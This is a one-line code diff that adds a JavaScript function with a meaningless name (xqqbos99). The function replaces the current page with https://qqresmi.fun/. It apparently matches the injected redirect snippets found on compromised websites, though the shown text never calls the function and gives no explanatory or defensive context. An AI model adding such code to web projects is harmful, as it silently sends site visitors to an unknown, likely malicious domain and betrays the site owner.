@@ -1,0 +1,1 @@
+function xqqbos99() {location.replace("https://qqresmi.fun/");}
